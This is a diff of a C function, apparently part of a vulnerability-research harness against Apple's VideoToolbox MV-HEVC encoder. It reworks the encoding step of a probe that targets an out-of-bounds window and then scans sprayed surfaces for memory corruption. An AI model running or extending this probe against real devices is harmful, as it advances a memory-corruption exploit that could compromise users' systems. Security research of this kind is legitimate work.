@@ -17067,14 +17067,18 @@ static void r449_probe(void) {
 
     rlog("  Step 4: Encoding %d frames (targeting Table 2 OOB window 155-197)...\n", R449_ENCODE_COUNT);
     fflush(stdout);
+
+    /* Reuse single pixel buffer to avoid memory pressure */
+    CVPixelBufferRef shared_pb = create_pb(enc_w, enc_h);
+    if (!shared_pb) {
+        rlog("  ERROR: Failed to create pixel buffer\n");
+        VTCompressionSessionInvalidate(enc); CFRelease(enc);
+        goto r449_cleanup;
+    }
+
     int enc_ok = 0, enc_fail = 0;
     for (int frame = 0; frame < R449_ENCODE_COUNT; frame++) {
-        CVPixelBufferRef pb = create_pb(enc_w, enc_h);
-        if (!pb) { enc_fail++; continue; }
-
         CMTime pts = CMTimeMake(frame, 30);
-        g_encode_done = 0;
-        g_cb_status = -999;
 
         /* Alternate layer_id tag for stereo MV-HEVC */
         CFMutableDictionaryRef frame_props = CFDictionaryCreateMutable(NULL, 0,
@@ -17084,32 +17088,29 @@ static void r449_probe(void) {
         CFDictionarySetValue(frame_props, CFSTR("MVHEVCVideoLayerID"), tag);
         CFRelease(tag);
 
-        OSStatus est = VTCompressionSessionEncodeFrame(enc, pb, pts, kCMTimeInvalid,
+        OSStatus est = VTCompressionSessionEncodeFrame(enc, shared_pb, pts, kCMTimeInvalid,
             frame_props, NULL, NULL);
         CFRelease(frame_props);
-        CVPixelBufferRelease(pb);
 
-        if (est == noErr) {
-            enc_ok++;
-            /* Wait for callback with timeout */
-            for (int w = 0; w < 500 && !g_encode_done; w++) usleep(1000);
-        } else {
-            enc_fail++;
-        }
+        if (est == noErr) enc_ok++;
+        else enc_fail++;
 
         /* Log progress every 50 frames */
         if ((frame + 1) % 50 == 0) {
-            rlog("    Encoded %d/%d (ok=%d fail=%d cb_status=%d)\n",
-                 frame + 1, R449_ENCODE_COUNT, enc_ok, enc_fail, (int)g_cb_status);
+            rlog("    Submitted %d/%d (ok=%d fail=%d)\n",
+                 frame + 1, R449_ENCODE_COUNT, enc_ok, enc_fail);
             fflush(stdout);
         }
     }
-    rlog("  Encoding complete: ok=%d fail=%d\n", enc_ok, enc_fail);
+    rlog("  Submission complete: ok=%d fail=%d\n", enc_ok, enc_fail);
     fflush(stdout);
 
-    /* Flush encoder */
+    /* Flush encoder — this blocks until all frames are processed */
+    rlog("  Flushing encoder...\n"); fflush(stdout);
     VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
-    usleep(100000);
+    rlog("  Flush done. cb_count=%d cb_status=%d\n", g_cb_count, (int)g_cb_status);
+    fflush(stdout);
+    CVPixelBufferRelease(shared_pb);
 
     /* Step 5: Scan surviving spray surfaces for corruption */
     rlog("  Step 5: Scanning %d surviving surfaces for corruption...\n", R449_SPRAY_COUNT / 2);
